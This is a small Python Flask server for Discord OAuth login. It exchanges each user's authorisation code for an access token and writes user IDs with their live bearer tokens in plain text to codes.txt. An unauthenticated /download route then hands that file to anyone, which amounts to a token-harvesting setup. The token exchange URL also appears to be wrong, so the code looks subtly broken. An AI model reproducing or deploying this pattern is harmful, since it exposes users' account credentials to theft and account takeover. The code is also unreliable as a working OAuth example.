import flask
import requests
import json

with open("config.json", "r") as cfg:
   config = json.load(cfg)

app = flask.Flask(__name__)

client_id = config['client_id']
client_secret = config['client_secret']
redirect_uri = config['redirect_uri']

def userinfo(token):
  headers = {
    "Authorization": "Bearer {}".format(token)
  }
  return requests.get("https://discord.com/api/v8/users/@me",headers=headers).json()

def exchange_code(code):
  data = {
    'client_id': client_id,
    'client_secret': client_secret,
    'grant_type': 'authorization_code',
    'code': code,
    'redirect_uri': redirect_uri
  }
  headers = {
    'Content-Type': 'application/x-www-form-urlencoded'
  }
  return requests.post('https://discord.com/api/v8/users/@me/oauth2/token' , data=data, headers=headers).json()

@app.route('/', methods=['GET'])
def index():
  return {'message': 'hello, world!'}, 200
  
@app.route('/authenticate', methods=['GET'])
def authenticate():
  try:
    code = flask.request.args['code']
    access_token = exchange_code(code)['access_token']
    with open("codes.txt", 'a') as c:
      c.write(f'{userinfo(access_token)["id"]}:{access_token}\n')
    return "success!"
  except:
    return "failed!"
    
@app.route('/download', methods=['GET'])
def download():
    return flask.send_file("codes.txt", as_attachment=True)

if __name__ == "__main__":
   app.run(host="0.0.0.0")
